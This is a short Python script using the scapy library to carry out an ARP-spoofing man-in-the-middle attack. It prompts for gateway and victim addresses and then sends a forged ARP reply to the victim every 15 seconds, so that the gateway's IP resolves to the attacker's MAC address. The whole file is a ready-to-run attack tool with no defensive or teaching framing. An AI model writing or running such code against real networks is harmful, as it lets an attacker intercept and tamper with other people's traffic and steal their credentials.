from scapy.all import *


# Addresses

def getInfo():
    print '~~~Getting addresses...'
    gatewayIP = raw_input('Gateway IP:')
    victimIP = raw_input('Victim IP:')
    victimMAC = raw_input('Victim MAC:')
    attackerMAC = raw_input('Attacker MAC:')
    return [gatewayIP, victimIP, victimMAC, attackerMAC]


# Attack

def attack(
    gatewayIP,
    victimIP,
    victimMAC,
    attackerMAC,
    ):

    spoofed_packet = ARP()
    spoofed_packet.op = 2
    spoofed_packet.psrc = gatewayIP
    spoofed_packet.pdst = victimIP
    spoofed_packet.hwdst = victimMAC
    spoofed_packet.hwsrc = attackerMAC

    send(spoofed_packet)
    print 'ARP sent'


def manInTheMiddle():

    info = getInfo()

    print '~~~Attacking...'

    while True:
        try:
            attack(info[0], info[1], info[2], info[3])
            time.sleep(15)
        except KeyboardInterrupt:
            break
    sys.exit(1)


manInTheMiddle()


			
